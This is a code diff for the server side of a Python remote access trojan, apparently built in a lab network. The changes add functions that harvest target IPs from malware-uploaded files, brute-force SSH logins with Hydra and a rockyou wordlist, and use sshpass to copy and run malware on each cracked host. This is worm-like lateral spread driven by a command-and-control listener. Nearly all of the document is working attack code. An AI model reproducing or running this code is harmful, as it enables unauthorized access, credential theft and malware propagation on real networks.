@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import ipaddress
 import socket
 import pyfiglet
 import json
@@ -7,6 +8,8 @@ import base64
 import sys
 import time
 from datetime import datetime
+import subprocess
+import os
 
 
 
@@ -45,41 +48,88 @@ class SERVER:
         file.write(b64decoded_bytes)
         file.close()
 
-    def RunHydra(self):
-        fileList = os.listdir(".")
+    def ParsePCFiles(self):
+        allDiscoveredIPs = []
+        fileList = os.listdir(".") # find all files in folder
         for file in fileList:
-            if file.endswith(".pc"):
-                runHydra = False
+            if file.endswith(".pc"): #if that file is a .pc file uploaded from malware
                 print ("Checking File: " + file)
-                with open(file) as thisFile:
-                    for line in thisFile:
-                        if 'password' in line or 'Hydra attempted:yes' in line:
-                            print('password or hydra attempt present')
-                            runHydra = False
-                        else:
-                            #checking line for either string indicating that hydra is not needed
-                            runHydra=True
-                            break
+                with open(file, 'r') as thisFile:#open file
+                    for line in thisFile: # check lines
+                        if "Discovered IP address:" in line: #if we find a discovered IP address
+                            allDiscoveredIPs.append(line.strip()) #write to the list of discovered IP addresses
 
-                with open(file,'a') as thisFile:
-                    if runHydra == True:
-                        print('run hydra on ' + str(thisFile.name))
-                        thisFile.write('\n'+ "Hydra attempted:yes")
-                        hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', "ssh://192.168.56.115"],capture_output=True)
-                        print(hResult.stdout)
-                        #parse hydra data and write password to file
-                        passIndex = str(hResult.stdout).find("password:") + 10 # get index of location of 'password: ' in results
-                        password = str(hResult.stdout)[passIndex:]
-                        endIndex = password.find("1 of 1") #find end of password
-                        password = password[0:endIndex-2]
-                        print("Hydra found password is : " + password)
-                        thisFile.write('\n'+ 'password: ' + password)
+        #print("Discovered IPS: " + str(allDiscoveredIPs))
+        #create file of target PCs
+        #check if IP is already on the list and only add them if it is not in list
+        existingIPAddresses = []
 
+        #create file if needed
+        fileName = "targetPCs.txt"
+        targetFile = open(fileName,'a') 
+        targetFile.close()
+        
+        # open file and check IPs that are already there
+        with open(fileName, 'r') as f:
+            for line in f:
+                existingIPAddresses.append(line.strip())
+
+        #open file and append IP addresses that are not in file
+        with open(fileName, 'a') as f:
+            for i in range(len(allDiscoveredIPs)):
+                if allDiscoveredIPs[i] not in existingIPAddresses:
+                    f.write(allDiscoveredIPs[i] + '\n')
+
+        
+
+    def RunHydra(self):
+        #check the available targets file for IP addresses and checks that against all .pc files ip addresses.
+        #if .pc file for that computer/ip address does not exist or contain a password or a 'hydra attempt' it will run hydra and run write results to targetPCs.txt
+        print("running hydra")
+
+        #get list of targets
+        with open("targetPCs.txt") as targetFile:
+            discoveredIPs = []
+            for line in targetFile:
+                discoveredIPs.append(line.strip())
+        #print(discoveredIPs)
+
+        pcList = {}
+        fileList = os.listdir(".") # find all files in folder
+        for file in fileList:
+            if file.endswith(".pc"): #if that file is a .pc file uploaded from malware
+                print ("Checking File: " + file)
+                with open(file) as thisFile: #open the file and parse hostname and IP data into a dict if it does not contain a password or hydra attempt
+                    if 'password' in open(file).read() or 'Hydra' in open(file).read():
+                        print("password or hydra attempt in file: " + file)
                     else:
-                        print('do NOT run hydra on ' + str(thisFile.name))    
+                        for line in thisFile: # if the file does not have a hydra or password entry, add to dict
+                            if "Hostname: " in line:
+                                pcList[file.strip()]
+                            if "IP Address:" in line:                       
+                                #print(line[11:].strip())
+                                pcList[file.strip()] = str(line[11:].strip())
+                                
+
+        #run hydra for each PC that still needs an attempt
+        for key, value in pcList.items():
+            print(key + " " + value)
+            hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', f"ssh://{value}"],capture_output=True)
+
+            
+            #parse hydra data and write password to file
+            passIndex = str(hResult.stdout).find("password:") + 10 # get index of location of 'password: ' in results
+            password = str(hResult.stdout)[passIndex:]
+            endIndex = password.find("1 of 1") #find end of password
+            password = password[0:endIndex-2]
+            print("Hydra found password is : " + password)
+
+            with open(key, 'a') as thisFile:
+                thisFile.write('\n'+ 'password: ' + password)   
 
 
-    def malSpread(self):
+
+    def MalSpread(self):
         # fileList = os.listdir(".")
         # for file in fileList:
         #     if file.endswith(".pc"):
@@ -101,18 +151,35 @@ class SERVER:
         #                     malExecResult = subprocess.run(["sshpass", "-p", thisPass, "ssh", "user1@192.168.56.115", "/home/user1/Desktop/malware-pc3.py"],capture_output=True)
         #                     print(malExecResult.stdout)
         #                     print(malExecResult.stderr)
-            thisIP = '192.168.56.115'
-            thisPass = 'rockyou!'
-            print("spread attempt")
-            transResult = subprocess.run(["sshpass", "-p", "rockyou!", "scp", "./malware-pc3.py", "user1@192.168.56.115:/home/user1/Desktop/"],capture_output=True)
-            print(transResult.stdout)
-            print(transResult.stderr)
 
-            malExecResult = subprocess.Popen(["sshpass", "-p", "rockyou!", "ssh", "user1@192.168.56.115", "/home/user1/Desktop/malware-pc3.py"])
-            print(malExecResult.stdout)
-            print(malExecResult.stderr)
+        #check files to see if we have already have a password, if we have not already compromised a PC, then tries to compromise if true
+        print("spreading malware")
+        malTarget = {}
+        fileName = "targetPCs.txt"
+        fileList = os.listdir(".")
+        for file in fileList:
+            if file.endswith(".pc"):
+                with open(file) as thisFile:
+                    if 'malware' not in open(file).read() and 'password' in open(file).read(): #if we do not already have malware installed and we do have the password
+                        pcName = file[0:-3]
+                        thisIP = ''
+                        thisPass = ''
+                        for line in thisFile:
+                            if "IP Address:" in line:
+                                thisIP = line[11:].strip()
+                            if "password" in line:
+                                thisPass = line[9:].strip()
+                        print(thisIP + " " +thisPass)
+                    
+                        transResult = subprocess.run(["sshpass", "-p", f"{thisPass}", "scp", f"./malware-{pcName}.py", f"user1@{thisIP}:/home/user1/Desktop/"],capture_output=True)
+                        #print(transResult.stdout)
+                        #print(transResult.stderr)
+
+                        malExecResult = subprocess.Popen(["sshpass", "-p", f"{thisPass}", "ssh", f"user1@{thisIP}", f"/home/user1/Desktop/malware-{pcName}.py"])
+                        # print(malExecResult.stdout)
+                        # print(malExecResult.stderr)
     
-    # setting up function for webcam accessability for later use
+    # setting up function for webcam accessability for later uses
     def vidstream_server(self):
         try:
             from vidstream import StreamingServer
@@ -263,12 +330,13 @@ class SERVER:
                     self.exit()
 
 # setting host port and ip to construct with the server class
-rat = SERVER('0.0.0.0', 3312)
+rat = SERVER('0.0.0.0', 4442)
 
 
 if __name__ == '__main__':
-    #rat.connection()
+    rat.connection()
     rat.CompromisedExfil()
+    rat.ParsePCFiles()
     rat.RunHydra()
-    rat.malSpread()
+    #rat.MalSpread()
     rat.mainloop()
